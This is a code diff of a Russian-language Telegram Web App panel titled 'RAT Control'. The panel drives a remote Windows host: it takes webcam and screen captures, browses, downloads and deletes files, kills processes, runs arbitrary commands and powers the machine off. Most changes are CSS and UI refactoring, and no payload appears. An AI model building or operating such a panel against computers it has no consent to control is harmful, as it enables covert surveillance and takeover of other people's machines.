@@ -3,7 +3,7 @@
 <head>
     <title>RAT Control</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -20,7 +20,6 @@
             padding-bottom: 70px;
         }
 
-        /* Шапка - минималистичная */
         .header {
             background: #0088cc;
             color: white;
@@ -29,17 +28,9 @@
             border-radius: 0 0 15px 15px;
         }
 
-        .header h1 {
-            font-size: 20px;
-            margin-bottom: 3px;
-        }
+        .header h1 { font-size: 20px; margin-bottom: 3px; }
+        .header p { font-size: 12px; opacity: 0.9; }
 
-        .header p {
-            font-size: 12px;
-            opacity: 0.9;
-        }
-
-        /* Быстрая статистика - компактно */
         .stats-row {
             display: flex;
             justify-content: space-between;
@@ -54,26 +45,16 @@
             flex: 1;
         }
 
-        .stat-value {
-            font-size: 14px;
-            font-weight: bold;
-        }
+        .stat-value { font-size: 14px; font-weight: bold; }
+        .stat-label { font-size: 9px; opacity: 0.8; }
 
-        .stat-label {
-            font-size: 9px;
-            opacity: 0.8;
-        }
-
-        /* Подключение - компактно */
         .connection-bar {
             background: white;
             border-radius: 10px;
             padding: 10px;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             display: flex;
-            align-items: center;
             gap: 8px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
 
         .connection-input {
@@ -90,25 +71,20 @@
             border: none;
             border-radius: 8px;
             padding: 10px 15px;
-            font-size: 12px;
-            white-space: nowrap;
         }
 
         .connection-status {
-            font-size: 11px;
+            font-size: 12px;
             padding: 5px;
-            border-radius: 5px;
             text-align: center;
+            margin-bottom: 10px;
         }
 
-        /* Вкладки - компактные */
         .tabs {
             display: flex;
             gap: 5px;
             margin-bottom: 15px;
             overflow-x: auto;
-            padding: 2px;
-            -webkit-overflow-scrolling: touch;
         }
 
         .tab {
@@ -126,7 +102,9 @@
             color: white;
         }
 
-        /* Карточки - минималистичные */
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
         .card {
             background: white;
             border-radius: 12px;
@@ -142,7 +120,6 @@
             color: #0088cc;
         }
 
-        /* Сетки кнопок */
         .grid-2 {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -154,10 +131,8 @@
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 6px;
-            margin-bottom: 6px;
         }
 
-        /* Кнопки - минималистичные */
         .btn {
             border: none;
             border-radius: 8px;
@@ -175,7 +150,118 @@
         .btn-danger { background: #dc3545; color: white; }
         .btn-info { background: #17a2b8; color: white; }
 
-        /* Быстрые пути - компактно */
+        .output {
+            background: #1a1a1a;
+            color: #0f0;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 12px;
+            font-family: monospace;
+            line-height: 1.5;
+            max-height: 300px;
+            overflow-y: auto;
+            margin: 8px 0;
+            white-space: pre-wrap;
+        }
+
+        /* Модальное окно для скриншотов */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .modal img {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 10px;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 30px;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .file-list {
+            max-height: 250px;
+            overflow-y: auto;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-top: 8px;
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            font-size: 12px;
+        }
+
+        .file-icon { font-size: 16px; margin-right: 10px; }
+        .file-name { flex: 1; }
+        .file-size { color: #666; margin-right: 10px; }
+
+        .path-bar {
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 8px 0;
+            font-size: 12px;
+            word-break: break-all;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 5px;
+            margin: 8px 0;
+        }
+
+        .input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 12px;
+        }
+
+        .proc-table {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            font-size: 11px;
+        }
+
+        .proc-header, .proc-row {
+            display: grid;
+            grid-template-columns: 45px 1fr 35px 35px;
+            padding: 8px 5px;
+        }
+
+        .proc-header {
+            background: #0088cc;
+            color: white;
+        }
+
         .quick-paths {
             display: flex;
             gap: 5px;
@@ -192,83 +278,6 @@
             white-space: nowrap;
         }
 
-        /* Поля ввода */
-        .input-group {
-            display: flex;
-            gap: 5px;
-            margin: 8px 0;
-        }
-
-        .input {
-            flex: 1;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 12px;
-        }
-
-        /* Путь */
-        .path-bar {
-            background: #f8f9fa;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 10px;
-            margin: 8px 0;
-            font-size: 11px;
-            word-break: break-all;
-        }
-
-        /* Список файлов */
-        .file-list {
-            max-height: 250px;
-            overflow-y: auto;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            margin-top: 8px;
-        }
-
-        .file-item {
-            display: flex;
-            align-items: center;
-            padding: 10px;
-            border-bottom: 1px solid #eee;
-            font-size: 11px;
-        }
-
-        .file-icon { font-size: 14px; margin-right: 8px; }
-        .file-name { flex: 1; }
-        .file-size { color: #666; margin-right: 8px; font-size: 10px; }
-
-        /* Процессы */
-        .proc-table {
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            overflow: hidden;
-            margin-top: 8px;
-            font-size: 10px;
-        }
-
-        .proc-header, .proc-row {
-            display: grid;
-            grid-template-columns: 40px 1fr 35px 35px;
-            padding: 6px 5px;
-        }
-
-        .proc-header { background: #0088cc; color: white; }
-
-        /* Вывод */
-        .output {
-            background: #1a1a1a;
-            color: #0f0;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 11px;
-            max-height: 200px;
-            overflow-y: auto;
-            margin: 8px 0;
-        }
-
-        /* Статус */
         .status {
             position: fixed;
             bottom: 80px;
@@ -286,7 +295,6 @@
 
         .status.show { display: block; }
 
-        /* Нижняя панель */
         .bottom-bar {
             position: fixed;
             bottom: 0;
@@ -333,7 +341,7 @@
 
     <!-- Подключение -->
     <div class="connection-bar">
-        <input type="text" id="serverIP" class="connection-input" placeholder="IP:порт (192.168.1.100:5000)" value="localhost:5000">
+        <input type="text" id="serverIP" class="connection-input" placeholder="IP:порт (localhost:5000)" value="localhost:5000">
         <button class="connection-btn" onclick="testConnection()">🔄</button>
     </div>
     <div id="connectionStatus" class="connection-status">⏳ Проверка...</div>
@@ -343,7 +351,7 @@
         <div class="tab active" onclick="switchTab('main')">📊 Главная</div>
         <div class="tab" onclick="switchTab('files')">📁 Файлы</div>
         <div class="tab" onclick="switchTab('procs')">📋 Процессы</div>
-        <div class="tab" onclick="switchTab('power')">⚡ Питание</div>
+        <div class="tab" onclick="switchTab('power')">⚡ Управление</div>
     </div>
 
     <!-- ГЛАВНАЯ -->
@@ -356,15 +364,16 @@
                 <button class="btn btn-success" onclick="sendCommand('memory')">RAM</button>
                 <button class="btn btn-warning" onclick="sendCommand('disk')">Диск</button>
             </div>
-            <div id="mainOutput" class="output">Нажмите кнопку</div>
+            <div id="systemOutput" class="output">Нажмите кнопку</div>
         </div>
 
         <div class="card">
             <div class="card-title">📸 МЕДИА</div>
             <div class="grid-2">
-                <button class="btn btn-primary" onclick="takeScreenshot()">Скриншот</button>
-                <button class="btn btn-info" onclick="takeWebcamPhoto()">Вебка</button>
+                <button class="btn btn-primary" onclick="takeScreenshot()">📸 Скриншот</button>
+                <button class="btn btn-info" onclick="takeWebcamPhoto()">📷 Вебкамера</button>
             </div>
+            <div id="screenshotContainer"></div>
         </div>
 
         <div class="card">
@@ -376,6 +385,15 @@
             </div>
             <div id="networkOutput" class="output"></div>
         </div>
+
+        <div class="card">
+            <div class="card-title">💻 КОМАНДЫ</div>
+            <div class="input-group">
+                <input type="text" id="customCmd" class="input" placeholder="Введите команду">
+                <button class="btn btn-primary" onclick="runCustomCommand()">Выполнить</button>
+            </div>
+            <div id="cmdOutput" class="output"></div>
+        </div>
     </div>
 
     <!-- ФАЙЛЫ -->
@@ -383,13 +401,11 @@
         <div class="card">
             <div class="card-title">📁 ФАЙЛЫ</div>
             
-            <!-- Быстрые пути -->
             <div class="quick-paths">
                 <span class="path-chip" onclick="quickPath('C:\\')">C:\</span>
                 <span class="path-chip" onclick="quickPath('D:\\')">D:\</span>
-                <span class="path-chip" onclick="quickPath(os.getenv('USERPROFILE'))">Домой</span>
-                <span class="path-chip" onclick="quickPath(os.getenv('USERPROFILE') + '\\Desktop')">Рабочий стол</span>
-                <span class="path-chip" onclick="quickPath(os.getenv('USERPROFILE') + '\\Downloads')">Загрузки</span>
+                <span class="path-chip" onclick="quickPath('C:\\Users')">Users</span>
+                <span class="path-chip" onclick="quickPath('C:\\Windows')">Windows</span>
             </div>
 
             <div class="path-bar" id="currentPath">C:\</div>
@@ -424,34 +440,20 @@
                 <button class="btn btn-danger" onclick="killProcess()">Убить</button>
             </div>
 
-            <div class="proc-table">
-                <div class="proc-header">
-                    <span>PID</span><span>Имя</span><span>CPU</span><span>RAM</span>
-                </div>
-                <div id="processesList"></div>
-            </div>
+            <div id="processesOutput" class="output"></div>
         </div>
     </div>
 
-    <!-- ПИТАНИЕ -->
+    <!-- УПРАВЛЕНИЕ -->
     <div id="tab-power" class="tab-content">
         <div class="card">
-            <div class="card-title">⚡ УПРАВЛЕНИЕ</div>
+            <div class="card-title">⚡ ПИТАНИЕ</div>
             <div class="grid-2">
-                <button class="btn btn-danger" onclick="sendCommand('shutdown')">Выкл</button>
-                <button class="btn btn-warning" onclick="sendCommand('restart')">Рестарт</button>
-                <button class="btn btn-info" onclick="sendCommand('lock')">Блок</button>
+                <button class="btn btn-danger" onclick="sendCommand('shutdown')">Выключить</button>
+                <button class="btn btn-warning" onclick="sendCommand('restart')">Перезагрузить</button>
+                <button class="btn btn-info" onclick="sendCommand('lock')">Блокировка</button>
                 <button class="btn btn-success" onclick="sendCommand('sleep')">Сон</button>
             </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">💻 КОМАНДЫ</div>
-            <div class="input-group">
-                <input type="text" id="customCmd" class="input" placeholder="cmd">
-                <button class="btn btn-primary" onclick="runCustomCommand()">→</button>
-            </div>
-            <div id="cmdOutput" class="output"></div>
         </div>
     </div>
 
@@ -469,7 +471,6 @@
         // Настройки
         let serverAddress = localStorage.getItem('serverAddr') || 'localhost:5000';
         let currentDir = 'C:\\';
-        let lastCmdTime = 0;
 
         document.getElementById('serverIP').value = serverAddress;
 
@@ -496,6 +497,12 @@
                 }
                 const response = await fetch(url, options);
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                
+                // Для скриншотов возвращаем blob
+                if (endpoint.includes('screenshot') || endpoint.includes('webcam')) {
+                    return await response.blob();
+                }
+                
                 return await response.json();
             } catch (e) {
                 showStatus('❌ ' + e.message, 'error');
@@ -509,12 +516,39 @@
                 const data = await apiRequest('/api/command', 'POST', { command: cmd, params });
                 if (data?.success) {
                     showStatus('✅ OK', 'success');
+                    
+                    // Обновляем соответствующий output
+                    if (cmd === 'system' || cmd === 'cpu' || cmd === 'memory' || cmd === 'disk') {
+                        document.getElementById('systemOutput').textContent = formatOutput(data.data);
+                    } else if (cmd === 'network' || cmd === 'externalip' || cmd === 'wifi') {
+                        document.getElementById('networkOutput').textContent = formatOutput(data.data);
+                    } else if (cmd === 'processes' || cmd === 'topcpu') {
+                        document.getElementById('processesOutput').textContent = formatProcesses(data.data);
+                    } else if (cmd === 'cmd') {
+                        document.getElementById('cmdOutput').textContent = data.output || formatOutput(data.data);
+                    }
+                    
                     return data.data;
                 }
                 showStatus('❌ ' + (data?.error || 'Ошибка'), 'error');
             } catch (e) {
                 return null;
             }
+        }
+
+        function formatOutput(data) {
+            if (!data) return 'Нет данных';
+            if (typeof data === 'string') return data;
+            return JSON.stringify(data, null, 2);
+        }
+
+        function formatProcesses(procs) {
+            if (!procs || !procs.length) return 'Нет процессов';
+            let html = '';
+            procs.slice(0, 20).forEach(p => {
+                html += `PID: ${p.pid} | ${p.name} | CPU: ${p.cpu}% | RAM: ${p.ram}%\n`;
+            });
+            return html;
         }
 
         // ==================== ПОДКЛЮЧЕНИЕ ====================
@@ -555,7 +589,7 @@
                 
                 let html = '';
                 data.files.slice(0, 30).forEach(f => {
-                    html += `<div class="file-item" onclick="selectFile('${f.name}')">
+                    html += `<div class="file-item" onclick="selectFile('${f.name.replace(/'/g, "\\'")}')">
                         <span class="file-icon">${f.is_dir ? '📁' : '📄'}</span>
                         <span class="file-name">${f.name}</span>
                         <span class="file-size">${f.size}</span>
@@ -572,17 +606,25 @@
             }
         }
 
-        function quickPath(path) { currentDir = path; listFiles(); }
-        function selectFile(name) { document.getElementById('fileName').value = name; }
+        function quickPath(path) { 
+            currentDir = path; 
+            listFiles(); 
+        }
+
+        function selectFile(name) { 
+            document.getElementById('fileName').value = name; 
+        }
 
         async function downloadFile() {
             const name = document.getElementById('fileName').value;
-            if (name) window.open(getBaseUrl() + '/api/download?path=' + encodeURIComponent(currentDir + '\\' + name), '_blank');
+            if (name) {
+                window.open(getBaseUrl() + '/api/download?path=' + encodeURIComponent(currentDir + '\\' + name), '_blank');
+            }
         }
 
         async function deleteFile() {
             const name = document.getElementById('fileName').value;
-            if (name && confirm('Удалить?')) {
+            if (name && confirm('Удалить ' + name + '?')) {
                 await apiRequest('/api/delete', 'POST', { path: currentDir + '\\' + name });
                 listFiles();
             }
@@ -597,21 +639,58 @@
             }
         }
 
-        // ==================== МЕДИА ====================
+        // ==================== СКРИНШОТЫ ====================
         async function takeScreenshot() {
-            showStatus('📸 Скриншот...');
-            window.open(getBaseUrl() + '/api/screenshot', '_blank');
+            showStatus('📸 Делаю скриншот...');
+            try {
+                const blob = await apiRequest('/api/screenshot');
+                const url = URL.createObjectURL(blob);
+                showImageModal(url);
+                showStatus('✅ Скриншот готов', 'success');
+            } catch (e) {
+                showStatus('❌ Ошибка', 'error');
+            }
         }
 
         async function takeWebcamPhoto() {
-            showStatus('📷 Фото...');
-            window.open(getBaseUrl() + '/api/webcam', '_blank');
+            showStatus('📷 Делаю фото...');
+            try {
+                const blob = await apiRequest('/api/webcam');
+                const url = URL.createObjectURL(blob);
+                showImageModal(url);
+                showStatus('✅ Фото готово', 'success');
+            } catch (e) {
+                showStatus('❌ Ошибка', 'error');
+            }
+        }
+
+        function showImageModal(url) {
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            
+            const img = document.createElement('img');
+            img.src = url;
+            
+            const closeBtn = document.createElement('div');
+            closeBtn.className = 'modal-close';
+            closeBtn.innerHTML = '✕';
+            closeBtn.onclick = () => document.body.removeChild(modal);
+            
+            modal.appendChild(img);
+            modal.appendChild(closeBtn);
+            modal.onclick = (e) => {
+                if (e.target === modal) document.body.removeChild(modal);
+            };
+            
+            document.body.appendChild(modal);
         }
 
         // ==================== КОМАНДЫ ====================
         function runCustomCommand() {
             const cmd = document.getElementById('customCmd').value;
-            if (cmd) sendCommand('cmd', { cmd });
+            if (cmd) {
+                sendCommand('cmd', { cmd });
+            }
         }
 
         // ==================== ВКЛАДКИ ====================
@@ -620,6 +699,7 @@
             document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
             event.target.classList.add('active');
             document.getElementById(`tab-${tab}`).classList.add('active');
+            
             if (tab === 'main') loadDashboard();
             if (tab === 'files') listFiles();
             if (tab === 'procs') sendCommand('processes');
